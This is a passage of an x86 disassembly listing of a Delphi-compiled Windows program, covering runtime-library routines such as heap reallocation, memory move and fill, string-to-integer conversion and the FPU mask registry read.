                cmp     dword ptr [eax], 0
                jz      short loc_154E
                cmp     dword ptr [eax+8], 0Ch
                jge     short loc_155A

loc_154E:                               ; CODE XREF: sub_1404+13D↑j
                                        ; sub_1404+142↑j
                mov     dword ptr ds:40A5B0h, 0Bh
                jmp     short loc_156D
; ---------------------------------------------------------------------------

loc_155A:                               ; CODE XREF: sub_1404+148↑j
                mov     edx, [eax+8]
                add     ebx, edx
                call    sub_D2C

loc_1564:                               ; CODE XREF: sub_1404+135↑j
                mov     edx, ebx
                mov     eax, esi
                call    sub_F94

loc_156D:                               ; CODE XREF: sub_1404+6F↑j
                                        ; sub_1404+AE↑j ...
                mov     eax, ds:40A5B0h
                mov     [ebp+var_4], eax
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    40219Dh

loc_1582:                               ; CODE XREF: sub_1404+197↓j
                cmp     byte ptr ds:40A035h, 0
                jz      short locret_1595
                push    40A5B4h
                call    sub_4EC

locret_1595:                            ; CODE XREF: sub_1404+185↑j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_1582
; ---------------------------------------------------------------------------

loc_159D:                               ; CODE XREF: sub_1404+33↑j
                                        ; sub_1404+10F↑j
                mov     eax, [ebp+var_4]
                pop     edi
                pop     esi
                pop     ebx
                pop     ecx
                pop     ebp
                retn
sub_1404        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_15A8        proc near               ; CODE XREF: CODE:000017D0↓p

var_18          = dword ptr -18h
var_14          = dword ptr -14h

                push    ebx
                push    esi
                push    edi
                push    ebp
                add     esp, 0FFFFFFF8h
                mov     esi, edx
                add     esi, 7
                and     esi, 0FFFFFFFCh
                cmp     esi, 0Ch
                jge     short loc_15C1
                mov     esi, 0Ch

loc_15C1:                               ; CODE XREF: sub_15A8+12↑j
                mov     ebp, eax
                sub     ebp, 4
                mov     edi, [ebp+0]
                and     edi, 7FFFFFFCh
                mov     eax, ebp
                add     eax, edi
                mov     ebx, eax
                cmp     edi, esi
                jnz     short loc_15E0
                mov     al, 1
                jmp     loc_177B
; ---------------------------------------------------------------------------

loc_15E0:                               ; CODE XREF: sub_15A8+2F↑j
                cmp     edi, esi
                jle     loc_166B
                mov     edx, edi
                sub     edx, esi
                mov     [esp+18h+var_18], edx
                cmp     ebx, ds:40A608h
                jnz     short loc_162F
                mov     eax, [esp+18h+var_18]
                sub     ds:40A608h, eax
                mov     eax, [esp+18h+var_18]
                add     ds:40A604h, eax
                cmp     dword ptr ds:40A604h, 0Ch
                jge     loc_1762
                mov     eax, [esp+18h+var_18]
                add     ds:40A608h, eax
                mov     eax, [esp+18h+var_18]
                sub     ds:40A604h, eax
                mov     esi, edi
                jmp     loc_1762
; ---------------------------------------------------------------------------

loc_162F:                               ; CODE XREF: sub_15A8+4D↑j
                mov     ebx, eax
                test    byte ptr [ebx], 2
                jnz     short loc_1643
                mov     eax, ebx
                mov     edx, [eax+8]
                add     [esp+18h+var_18], edx
                call    sub_D2C

loc_1643:                               ; CODE XREF: sub_15A8+8C↑j
                cmp     [esp+18h+var_18], 0Ch
                jl      short loc_1664
                mov     ebx, ebp
                add     ebx, esi
                mov     eax, [esp+18h+var_18]
                or      eax, 2
                mov     [ebx], eax
                mov     eax, ebx
                add     eax, 4
                call    sub_DF0
                jmp     loc_1762
; ---------------------------------------------------------------------------

loc_1664:                               ; CODE XREF: sub_15A8+9F↑j
                mov     esi, edi
                jmp     loc_1762
; ---------------------------------------------------------------------------

loc_166B:                               ; CODE XREF: sub_15A8+3A↑j
                                        ; sub_15A8+1B1↓j
                mov     eax, esi
                sub     eax, edi
                mov     [esp+18h+var_14], eax
                cmp     ebx, ds:40A608h
                jnz     short loc_16E2
                mov     eax, ds:40A604h
                cmp     eax, [esp+18h+var_14]
                jl      short loc_16D9
                mov     eax, [esp+18h+var_14]
                sub     ds:40A604h, eax
                mov     eax, [esp+18h+var_14]
                add     ds:40A608h, eax
                cmp     dword ptr ds:40A604h, 0Ch
                jge     short loc_16BB
                mov     eax, ds:40A604h
                add     ds:40A608h, eax
                add     esi, ds:40A604h
                xor     eax, eax
                mov     ds:40A604h, eax

loc_16BB:                               ; CODE XREF: sub_15A8+F9↑j
                mov     eax, esi
                sub     eax, edi
                add     ds:40A5A0h, eax
                mov     eax, [ebp+0]
                and     eax, 80000003h
                or      esi, eax
                mov     [ebp+0], esi
                mov     al, 1
                jmp     loc_177B
; ---------------------------------------------------------------------------

loc_16D9:                               ; CODE XREF: sub_15A8+DC↑j
                call    sub_101C
                mov     ebx, ebp
                add     ebx, edi

loc_16E2:                               ; CODE XREF: sub_15A8+D1↑j
                test    byte ptr [ebx], 2
                jnz     short loc_1734
                mov     edx, ebx
                mov     eax, edx
                mov     ecx, [eax+8]
                mov     [esp+18h+var_18], ecx
                mov     ecx, [esp+18h+var_18]
                cmp     ecx, [esp+18h+var_14]
                jge     short loc_1708
                add     edx, [esp+18h+var_18]
                mov     ebx, edx
                mov     eax, [esp+18h+var_18]
                sub     [esp+18h+var_14], eax
                jmp     short loc_1734
; ---------------------------------------------------------------------------

loc_1708:                               ; CODE XREF: sub_15A8+150↑j
                call    sub_D2C
                mov     eax, [esp+18h+var_14]
                sub     [esp+18h+var_18], eax
                cmp     [esp+18h+var_18], 0Ch
                jl      short loc_1728
                mov     eax, ebp
                add     eax, esi
                mov     edx, [esp+18h+var_18]
                call    sub_F94
                jmp     short loc_1762
; ---------------------------------------------------------------------------

loc_1728:                               ; CODE XREF: sub_15A8+170↑j
                add     esi, [esp+18h+var_18]
                mov     ebx, ebp
                add     ebx, esi
                and     dword ptr [ebx], 0FFFFFFFEh
                jmp     short loc_1762
; ---------------------------------------------------------------------------

loc_1734:                               ; CODE XREF: sub_15A8+13D↑j
                                        ; sub_15A8+15E↑j
                mov     eax, [ebx]
                test    eax, 80000000h
                jz      short loc_175E
                and     eax, 7FFFFFFCh
                add     eax, ebx
                mov     ebx, eax
                mov     edx, [esp+18h+var_14]
                mov     eax, ebx
                call    sub_1120
                test    al, al
                jz      short loc_175E
                mov     ebx, ebp
                add     ebx, edi
                jmp     loc_166B
; ---------------------------------------------------------------------------

loc_175E:                               ; CODE XREF: sub_15A8+193↑j
                                        ; sub_15A8+1AB↑j
                xor     eax, eax
                jmp     short loc_177B
; ---------------------------------------------------------------------------

loc_1762:                               ; CODE XREF: sub_15A8+68↑j
                                        ; sub_15A8+82↑j ...
                mov     eax, esi
                sub     eax, edi
                add     ds:40A5A0h, eax
                mov     eax, [ebp+0]
                and     eax, 80000003h
                or      esi, eax
                mov     [ebp+0], esi
                mov     al, 1

loc_177B:                               ; CODE XREF: sub_15A8+33↑j
                                        ; sub_15A8+12C↑j ...
                pop     ecx
                pop     edx
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_15A8        endp

; ---------------------------------------------------------------------------
                align 4
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    esi
                push    edi
                mov     esi, edx
                mov     ebx, eax
                cmp     byte ptr ds:40A5ACh, 0
                jnz     short loc_17AB
                call    sub_B88
                test    al, al
                jnz     short loc_17AB
                xor     eax, eax
                mov     [ebp-4], eax
                jmp     loc_183C
; ---------------------------------------------------------------------------

loc_17AB:                               ; CODE XREF: CODE:00001796↑j
                                        ; CODE:0000179F↑j
                xor     edx, edx
                push    ebp
                push    402435h
                push    dword ptr fs:[edx]
                mov     fs:[edx], esp
                cmp     byte ptr ds:40A035h, 0
                jz      short loc_17CC
                push    40A5B4h
                call    sub_4E4

loc_17CC:                               ; CODE XREF: CODE:000017C0↑j
                mov     edx, esi
                mov     eax, ebx
                call    sub_15A8
                test    al, al
                jz      short loc_17DE
                mov     [ebp-4], ebx
                jmp     short loc_1814
; ---------------------------------------------------------------------------

loc_17DE:                               ; CODE XREF: CODE:000017D7↑j
                mov     eax, esi
                call    sub_1274
                mov     edi, eax
                mov     eax, ebx
                sub     eax, 4
                mov     eax, [eax]
                and     eax, 7FFFFFFCh
                sub     eax, 4
                cmp     esi, eax
                jge     short loc_17FC
                mov     eax, esi

loc_17FC:                               ; CODE XREF: CODE:000017F8↑j
                test    edi, edi
                jz      short loc_1811
                mov     edx, edi
                mov     ecx, ebx
                xchg    eax, ecx
                call    sub_194C
                mov     eax, ebx
                call    sub_1404

loc_1811:                               ; CODE XREF: CODE:000017FE↑j
                mov     [ebp-4], edi

loc_1814:                               ; CODE XREF: CODE:000017DC↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    40243Ch

loc_1821:                               ; CODE XREF: CODE:0000183A↓j
                cmp     byte ptr ds:40A035h, 0
                jz      short locret_1834
                push    40A5B4h
                call    sub_4EC

locret_1834:                            ; CODE XREF: CODE:00001828↑j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_1821
; ---------------------------------------------------------------------------

loc_183C:                               ; CODE XREF: CODE:000017A6↑j
                mov     eax, [ebp-4]
                pop     edi
                pop     esi
                pop     ebx
                pop     ecx
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1848        proc near               ; CODE XREF: sub_1BA0+13↓p
                                        ; sub_2558+C↓p ...
                push    ebx
                test    eax, eax
                jle     short loc_1862
                call    dword ptr ds:409030h
                mov     ebx, eax
                test    ebx, ebx
                jnz     short loc_1864
                mov     al, 1
                call    sub_1930
; ---------------------------------------------------------------------------
                jmp     short loc_1864
; ---------------------------------------------------------------------------

loc_1862:                               ; CODE XREF: sub_1848+3↑j
                xor     ebx, ebx

loc_1864:                               ; CODE XREF: sub_1848+F↑j
                                        ; sub_1848+18↑j
                mov     eax, ebx
                pop     ebx
                retn
sub_1848        endp


; =============== S U B R O U T I N E =======================================


sub_1868        proc near               ; CODE XREF: sub_2494+1C↓p
                                        ; sub_24B8+21↓p ...
                push    ebx
                test    eax, eax
                jz      short loc_1882
                call    dword ptr ds:409034h
                mov     ebx, eax
                test    ebx, ebx
                jz      short loc_1884
                mov     al, 2
                call    sub_1930
; ---------------------------------------------------------------------------
                jmp     short loc_1884
; ---------------------------------------------------------------------------

loc_1882:                               ; CODE XREF: sub_1868+3↑j
                xor     ebx, ebx

loc_1884:                               ; CODE XREF: sub_1868+F↑j
                                        ; sub_1868+18↑j
                mov     eax, ebx
                pop     ebx
                retn
sub_1868        endp


; =============== S U B R O U T I N E =======================================


sub_1888        proc near               ; CODE XREF: sub_2934+22↓p
                                        ; sub_2D98+BB↓p ...
                mov     ecx, [eax]
                test    ecx, ecx
                jz      short loc_18C0
                test    edx, edx
                jz      short loc_18AA
                push    eax
                mov     eax, ecx
                call    dword ptr ds:409038h
                pop     ecx
                or      eax, eax
                jz      short loc_18B9
                mov     [ecx], eax
                retn
; ---------------------------------------------------------------------------

loc_18A3:                               ; CODE XREF: sub_1888+2E↓j
                mov     al, 2
                jmp     sub_1930
; ---------------------------------------------------------------------------

loc_18AA:                               ; CODE XREF: sub_1888+8↑j
                mov     [eax], edx
                mov     eax, ecx
                call    dword ptr ds:409034h
                or      eax, eax
                jnz     short loc_18A3
                retn
; ---------------------------------------------------------------------------

loc_18B9:                               ; CODE XREF: sub_1888+16↑j
                                        ; sub_1888+48↓j
                mov     al, 1
                jmp     sub_1930
; ---------------------------------------------------------------------------

loc_18C0:                               ; CODE XREF: sub_1888+4↑j
                test    edx, edx
                jz      short locret_18D4
                push    eax
                mov     eax, edx
                call    dword ptr ds:409030h
                pop     ecx
                or      eax, eax
                jz      short loc_18B9
                mov     [ecx], eax

locret_18D4:                            ; CODE XREF: sub_1888+3A↑j
                retn
sub_1888        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn

sub_18D8        proc near               ; CODE XREF: sub_18E4+42↓p
                                        ; CODE:0000209B↓p
                mov     ds:409004h, edx
                call    sub_247C
sub_18D8        endp

; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn

sub_18E4        proc near               ; CODE XREF: sub_1930+6↓j
                push    ebx
                push    esi
                mov     esi, edx
                mov     ebx, eax
                and     bl, 7Fh
                cmp     dword ptr ds:40A008h, 0
                jz      short loc_1900
                mov     edx, esi
                mov     eax, ebx
                call    dword ptr ds:40A008h

loc_1900:                               ; CODE XREF: sub_18E4+10↑j
                test    bl, bl
                jnz     short loc_1911
                call    sub_32C8
                mov     ebx, [eax+4]
                jmp     short loc_1920
; ---------------------------------------------------------------------------

loc_1911:                               ; CODE XREF: sub_18E4+1E↑j
                cmp     bl, 18h
                ja      short loc_1920
                xor     eax, eax
                mov     al, bl
                mov     bl, [eax+40903Ch]

loc_1920:                               ; CODE XREF: sub_18E4+2B↑j
                                        ; sub_18E4+30↑j
                xor     eax, eax
                mov     al, bl
                mov     edx, esi
                call    sub_18D8
sub_18E4        endp

; ---------------------------------------------------------------------------
                pop     esi
                pop     ebx
                retn
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn

sub_1930        proc near               ; CODE XREF: sub_1848+13↑p
                                        ; sub_1868+13↑p ...
                and     eax, 7Fh
                mov     edx, [esp+0]
                jmp     sub_18E4
sub_1930        endp

; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================


sub_193C        proc near               ; CODE XREF: sub_1998+38↓p
                                        ; sub_1998+4C↓p
                push    ebx
                mov     ebx, eax
                call    sub_32C8
                mov     [eax+4], ebx
                pop     ebx
                retn
sub_193C        endp


; =============== S U B R O U T I N E =======================================


sub_194C        proc near               ; CODE XREF: CODE:00001805↑p
                                        ; sub_24E8+1B↓p ...
                push    esi
                push    edi
                mov     esi, eax
                mov     edi, edx
                mov     eax, ecx
                cmp     edi, esi
                ja      short loc_196B
                jz      short loc_1989
                sar     ecx, 2
                js      short loc_1989
                rep movsd
                mov     ecx, eax
                and     ecx, 3
                rep movsb
                pop     edi
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_196B:                               ; CODE XREF: sub_194C+A↑j
                lea     esi, [ecx+esi-4]
                lea     edi, [ecx+edi-4]
                sar     ecx, 2
                js      short loc_1989
                std
                rep movsd
                mov     ecx, eax
                and     ecx, 3
                add     esi, 3
                add     edi, 3
                rep movsb
                cld

loc_1989:                               ; CODE XREF: sub_194C+C↑j
                                        ; sub_194C+11↑j ...
                pop     edi
                pop     esi
                retn
sub_194C        endp


; =============== S U B R O U T I N E =======================================


sub_198C        proc near               ; CODE XREF: sub_6140+5A↓p
                                        ; sub_6140+6A↓p ...
                cmp     al, 61h ; 'a'
                jb      short locret_1996
                cmp     al, 7Ah ; 'z'
                ja      short locret_1996
                sub     al, 20h ; ' '

locret_1996:                            ; CODE XREF: sub_198C+2↑j
                                        ; sub_198C+6↑j
                retn
sub_198C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1998        proc near               ; CODE XREF: CODE:00003146↓p
                                        ; CODE:00003150↓p ...
                push    ebx
                push    esi
                mov     ebx, eax
                xor     esi, esi
                mov     ax, [ebx+4]
                cmp     ax, 0D7B1h
                jb      short loc_19D7
                cmp     ax, 0D7B3h
                ja      short loc_19D7
                and     ax, 0D7B2h
                cmp     ax, 0D7B2h
                jnz     short loc_19BF
                mov     eax, ebx
                call    dword ptr [ebx+1Ch]
                mov     esi, eax

loc_19BF:                               ; CODE XREF: sub_1998+1E↑j
                test    esi, esi
                jnz     short loc_19CA
                mov     eax, ebx
                call    dword ptr [ebx+24h]
                mov     esi, eax

loc_19CA:                               ; CODE XREF: sub_1998+29↑j
                test    esi, esi
                jz      short loc_19E9
                mov     eax, esi
                call    sub_193C
                jmp     short loc_19E9
; ---------------------------------------------------------------------------

loc_19D7:                               ; CODE XREF: sub_1998+E↑j
                                        ; sub_1998+14↑j
                cmp     ebx, 40A038h
                jz      short loc_19E9
                mov     eax, 67h ; 'g'
                call    sub_193C

loc_19E9:                               ; CODE XREF: sub_1998+34↑j
                                        ; sub_1998+3D↑j ...
                mov     eax, esi
                pop     esi
                pop     ebx
                retn
sub_1998        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_19F0        proc near               ; CODE XREF: sub_476C+99↓p
                                        ; sub_476C+139↓p ...
                push    ebx
                push    esi
                push    ecx
                mov     esi, ecx
                shr     esi, 2
                jz      short loc_1A20

loc_19FA:                               ; CODE XREF: sub_19F0+26↓j
                mov     ecx, [eax]
                mov     ebx, [edx]
                cmp     ecx, ebx
                jnz     short loc_1A47
                dec     esi
                jz      short loc_1A1A
                mov     ecx, [eax+4]
                mov     ebx, [edx+4]
                cmp     ecx, ebx
                jnz     short loc_1A47
                add     eax, 8
                add     edx, 8
                dec     esi
                jnz     short loc_19FA
                jmp     short loc_1A20
; ---------------------------------------------------------------------------

loc_1A1A:                               ; CODE XREF: sub_19F0+13↑j
                add     eax, 4
                add     edx, 4

loc_1A20:                               ; CODE XREF: sub_19F0+8↑j
                                        ; sub_19F0+28↑j
                pop     esi
                and     esi, 3
                jz      short loc_1A5C
                mov     cl, [eax]
                cmp     cl, [edx]
                jnz     short loc_1A5C
                dec     esi
                jz      short loc_1A42
                mov     cl, [eax+1]
                cmp     cl, [edx+1]
                jnz     short loc_1A5C
                dec     esi
                jz      short loc_1A42
                mov     cl, [eax+2]
                cmp     cl, [edx+2]
                jnz     short loc_1A5C

loc_1A42:                               ; CODE XREF: sub_19F0+3D↑j
                                        ; sub_19F0+48↑j
                xor     eax, eax
                pop     esi
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_1A47:                               ; CODE XREF: sub_19F0+10↑j
                                        ; sub_19F0+1D↑j
                pop     esi
                cmp     cl, bl
                jnz     short loc_1A5C
                cmp     ch, bh
                jnz     short loc_1A5C
                shr     ecx, 10h
                shr     ebx, 10h
                cmp     cl, bl
                jnz     short loc_1A5C
                cmp     ch, bh

loc_1A5C:                               ; CODE XREF: sub_19F0+34↑j
                                        ; sub_19F0+3A↑j ...
                pop     esi
                pop     ebx
                retn
sub_19F0        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_1A60        proc near               ; CODE XREF: sub_2D98+F1↓p
                                        ; sub_2D98+145↓p ...
                push    edi
                mov     edi, eax
                mov     ch, cl
                mov     eax, ecx
                shl     eax, 10h
                mov     ax, cx
                mov     ecx, edx
                sar     ecx, 2
                js      short loc_1A7D
                rep stosd
                mov     ecx, edx
                and     ecx, 3
                rep stosb

loc_1A7D:                               ; CODE XREF: sub_1A60+12↑j
                pop     edi
                retn
sub_1A60        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_1A80        proc near               ; CODE XREF: sub_6480+16↓p
                push    ebx
                xor     ebx, ebx
                imul    edx, [ebx+409008h], 8088405h
                inc     edx
                mov     [ebx+409008h], edx
                mul     edx
                mov     eax, edx
                pop     ebx
                retn
sub_1A80        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1A9C        proc near               ; CODE XREF: sub_30B4+41↓p
                push    ebx
                push    esi
                push    edi
                mov     esi, eax
                push    eax
                test    eax, eax
                jz      short loc_1B12
                xor     eax, eax
                xor     ebx, ebx
                mov     edi, 0CCCCCCCh

loc_1AAF:                               ; CODE XREF: sub_1A9C+19↓j
                mov     bl, [esi]
                inc     esi
                cmp     bl, 20h ; ' '
                jz      short loc_1AAF
                mov     ch, 0
                cmp     bl, 2Dh ; '-'
                jz      short loc_1B20
                cmp     bl, 2Bh ; '+'
                jz      short loc_1B22

loc_1AC3:                               ; CODE XREF: sub_1A9C+89↓j
                cmp     bl, 24h ; '$'
                jz      short loc_1B27
                cmp     bl, 78h ; 'x'
                jz      short loc_1B27
                cmp     bl, 58h ; 'X'
                jz      short loc_1B27
                cmp     bl, 30h ; '0'
                jnz     short loc_1AEA
                mov     bl, [esi]
                inc     esi
                cmp     bl, 78h ; 'x'
                jz      short loc_1B27
                cmp     bl, 58h ; 'X'
                jz      short loc_1B27
                test    bl, bl
                jz      short loc_1B08
                jmp     short loc_1AEE
; ---------------------------------------------------------------------------

loc_1AEA:                               ; CODE XREF: sub_1A9C+39↑j
                test    bl, bl
                jz      short loc_1B1B

loc_1AEE:                               ; CODE XREF: sub_1A9C+4C↑j
                                        ; sub_1A9C+6A↓j
                sub     bl, 30h ; '0'
                cmp     bl, 9
                ja      short loc_1B1B
                cmp     eax, edi
                ja      short loc_1B1B
                lea     eax, [eax+eax*4]
                add     eax, eax
                add     eax, ebx
                mov     bl, [esi]
                inc     esi
                test    bl, bl
                jnz     short loc_1AEE

loc_1B08:                               ; CODE XREF: sub_1A9C+4A↑j
                dec     ch
                jz      short loc_1B15
                test    eax, eax
                jge     short loc_1B64
                jmp     short loc_1B1B
; ---------------------------------------------------------------------------

loc_1B12:                               ; CODE XREF: sub_1A9C+8↑j
                                        ; sub_1A9C+95↓j
                inc     esi
                jmp     short loc_1B1B
; ---------------------------------------------------------------------------

loc_1B15:                               ; CODE XREF: sub_1A9C+6E↑j
                neg     eax
                jle     short loc_1B64
                js      short loc_1B64

loc_1B1B:                               ; CODE XREF: sub_1A9C+50↑j
                                        ; sub_1A9C+58↑j ...
                pop     ebx
                sub     esi, ebx
                jmp     short loc_1B67
; ---------------------------------------------------------------------------

loc_1B20:                               ; CODE XREF: sub_1A9C+20↑j
                inc     ch

loc_1B22:                               ; CODE XREF: sub_1A9C+25↑j
                mov     bl, [esi]
                inc     esi
                jmp     short loc_1AC3
; ---------------------------------------------------------------------------

loc_1B27:                               ; CODE XREF: sub_1A9C+2A↑j
                                        ; sub_1A9C+2F↑j ...
                mov     edi, 0FFFFFFFh
                mov     bl, [esi]
                inc     esi
                test    bl, bl
                jz      short loc_1B12

loc_1B33:                               ; CODE XREF: sub_1A9C+C0↓j
                cmp     bl, 61h ; 'a'
                jb      short loc_1B3B
                sub     bl, 20h ; ' '

loc_1B3B:                               ; CODE XREF: sub_1A9C+9A↑j
                sub     bl, 30h ; '0'
                cmp     bl, 9
                jbe     short loc_1B4E
                sub     bl, 11h
                cmp     bl, 5
                ja      short loc_1B1B
                add     bl, 0Ah

loc_1B4E:                               ; CODE XREF: sub_1A9C+A5↑j
                cmp     eax, edi
                ja      short loc_1B1B
                shl     eax, 4
                add     eax, ebx
                mov     bl, [esi]
                inc     esi
                test    bl, bl
                jnz     short loc_1B33
                dec     ch
                jnz     short loc_1B64
                neg     eax

loc_1B64:                               ; CODE XREF: sub_1A9C+72↑j
                                        ; sub_1A9C+7B↑j ...
                pop     ecx
                xor     esi, esi

loc_1B67:                               ; CODE XREF: sub_1A9C+82↑j
                mov     [edx], esi
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_1A9C        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_1B70        proc near               ; CODE XREF: sub_476C+84↓p
                                        ; sub_476C+124↓p ...
                mov     ecx, 0FFh
                call    sub_1B7C
                retn
sub_1B70        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1B7C        proc near               ; CODE XREF: sub_1B70+5↑p
                push    ebx
                push    eax
                cmp     ecx, 0FFh
                jbe     short loc_1B8B
                mov     ecx, 0FFh

loc_1B8B:                               ; CODE XREF: sub_1B7C+8↑j
                                        ; sub_1B7C+1A↓j
                mov     bl, [edx]
                inc     edx
                test    bl, bl
                jz      short loc_1B98
                inc     eax
                mov     [eax], bl
                dec     ecx
                jnz     short loc_1B8B

loc_1B98:                               ; CODE XREF: sub_1B7C+14↑j
                pop     edx
                sub     eax, edx
                mov     [edx], al
                pop     ebx
                retn
sub_1B7C        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_1BA0        proc near               ; CODE XREF: sub_38F8↓p
                cmp     edx, 1
                jnb     short loc_1BA6
                retn
; ---------------------------------------------------------------------------

loc_1BA6:                               ; CODE XREF: sub_1BA0+3↑j
                push    ecx
                test    eax, eax
                jnz     short loc_1BEE
                mov     eax, [edx-8]
                test    eax, eax
                jz      short loc_1BE7
                push    edx
                call    sub_1848
                pop     edx
                test    eax, eax
                jz      short loc_1BE3
                push    edi
                mov     ecx, [edx-8]
                mov     edi, eax
                push    eax
                xor     eax, eax
                shr     ecx, 2
                rep stosd
                mov     ecx, [edx-8]
                and     ecx, 3
                rep stosb
                pop     eax
                pop     edi
                mov     ecx, [edx-4]
                test    ecx, ecx
                jl      short loc_1BDF
                mov     [ecx+eax], edx

loc_1BDF:                               ; CODE XREF: sub_1BA0+3A↑j
                test    eax, eax
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_1BE3:                               ; CODE XREF: sub_1BA0+1B↑j
                xor     edx, edx
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_1BE7:                               ; CODE XREF: sub_1BA0+10↑j
                xor     edx, edx
                cmp     eax, 1
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_1BEE:                               ; CODE XREF: sub_1BA0+9↑j
                mov     ecx, [edx-4]
                test    ecx, ecx
                jl      short loc_1BF8
                mov     [ecx+eax], edx

loc_1BF8:                               ; CODE XREF: sub_1BA0+53↑j
                xor     edx, edx
                test    eax, eax
                pop     ecx
                retn
sub_1BA0        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_1C00        proc near               ; CODE XREF: sub_1C08+5↓p
                                        ; sub_1C08+11↓p
                jmp     dword ptr ds:415134h
sub_1C00        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1C08        proc near               ; CODE XREF: CODE:000031B5↓p
                push    ebx
                xor     ebx, ebx
                push    0
                call    sub_1C00
                cmp     eax, 7
                jnz     short loc_1C33
                push    1
                call    sub_1C00
                and     eax, 0FF00h
                cmp     eax, 0D00h
                jz      short loc_1C31
                cmp     eax, 400h
                jnz     short loc_1C33

loc_1C31:                               ; CODE XREF: sub_1C08+20↑j
                mov     bl, 1

loc_1C33:                               ; CODE XREF: sub_1C08+D↑j
                                        ; sub_1C08+27↑j
                mov     eax, ebx
                pop     ebx
                retn
sub_1C08        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1C38        proc near               ; CODE XREF: CODE:000031BE↓p

var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

; FUNCTION CHUNK AT 00001F30 SIZE 00000036 BYTES

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFF4h
                movzx   eax, word ptr ds:409018h
                mov     [ebp+var_8], eax
                lea     eax, [ebp+var_4]
                push    eax
                push    1
                push    0
                push    4028D0h
                push    80000002h
                call    sub_468
                test    eax, eax
                jnz     short loc_1CB0
                xor     eax, eax
                push    ebp
                push    4028A9h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     [ebp+var_C], 4
                lea     eax, [ebp+var_C]
                push    eax
                lea     eax, [ebp+var_8]
                push    eax
                push    0
                push    0
                push    4028ECh
                mov     eax, [ebp+var_4]
                push    eax
                call    sub_470
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    4028B0h

loc_1C9F:                               ; CODE XREF: sub_1C38+76↓j
                mov     eax, [ebp+var_4]
                push    eax
                call    sub_460
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_1C9F
; ---------------------------------------------------------------------------

loc_1CB0:                               ; CODE XREF: sub_1C38+29↑j
                mov     ax, ds:409018h
                and     ax, 0FFC0h
                mov     dx, word ptr [ebp+var_8]
                and     dx, 3Fh
                or      ax, dx
                mov     ds:409018h, ax
                mov     esp, ebp
                pop     ebp
                retn
sub_1C38        endp

; ---------------------------------------------------------------------------
                align 10h
aSoftwareBorlan db 'SOFTWARE\Borland\Delphi\RTL',0
aFpumaskvalue   db 'FPUMaskValue',0
                align 4

; =============== S U B R O U T I N E =======================================


sub_1CFC        proc near               ; CODE XREF: sub_218C-368↓p
                                        ; CODE:000020D2↓p ...
                fninit
                wait
                fldcw   word ptr ds:409018h
                retn
sub_1CFC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1D08        proc near               ; CODE XREF: CODE:00001F23↓j
                                        ; sub_1F68+30↓p ...
                test    eax, eax
                jz      short locret_1D13
                mov     dl, 1
                mov     ecx, [eax]
                call    dword ptr [ecx-4]

locret_1D13:                            ; CODE XREF: sub_1D08+2↑j
                retn
sub_1D08        endp


; =============== S U B R O U T I N E =======================================


sub_1D14        proc near               ; CODE XREF: sub_1F68+35↓p
                cmp     byte ptr ds:40901Ch, 1
                jbe     short locret_1D2E
                push    0
                push    0
                push    0
                push    0EEDFADFh
                call    dword ptr ds:40A010h

locret_1D2E:                            ; CODE XREF: sub_1D14+7↑j
                retn
sub_1D14        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_1D30        proc near               ; CODE XREF: sub_218C-33B↓p
                cmp     byte ptr ds:40901Ch, 0
                jz      short locret_1D50
                push    eax
                push    eax
                push    edx
                push    esp
                push    2
                push    0
                push    0EEDFAE4h
                call    dword ptr ds:40A010h
                add     esp, 8
                pop     eax

locret_1D50:                            ; CODE XREF: sub_1D30+7↑j
                retn
sub_1D30        endp

; ---------------------------------------------------------------------------
                align 4
; START OF FUNCTION CHUNK FOR sub_1D6C

loc_1D54:                               ; CODE XREF: sub_1D6C+B↓j
                push    esp
                push    1
